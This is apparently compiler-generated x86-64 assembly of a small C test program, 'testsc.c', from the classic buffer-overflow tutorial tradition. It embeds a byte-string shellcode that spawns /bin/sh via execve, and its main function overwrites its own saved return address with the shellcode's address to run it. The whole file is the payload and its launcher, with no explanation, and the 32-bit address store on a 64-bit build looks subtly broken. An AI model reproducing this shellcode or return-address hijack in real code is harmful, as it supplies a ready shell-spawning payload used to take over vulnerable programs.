	.file	"testsc.c"
	.globl	shellcode
	.data
	.align 32
	.type	shellcode, @object
	.size	shellcode, 46
shellcode:
	.string	"\353\037^\211v\b1\300\210F\007\211F\f\260\013\211\363\215N\b\215V\f\315\2001\333\211\330@\315\200\350\334\377\377\377/bin/sh"
	.text
	.globl	main
	.type	main, @function
main:
.LFB0:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	leaq	-8(%rbp), %rax
	addq	$8, %rax
	movq	%rax, -8(%rbp)
	movq	-8(%rbp), %rax
	movl	$shellcode, %edx
	movl	%edx, (%rax)
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE0:
	.size	main, .-main
	.ident	"GCC: (Ubuntu 4.9.2-0ubuntu1~14.04) 4.9.2"
	.section	.note.GNU-stack,"",@progbits
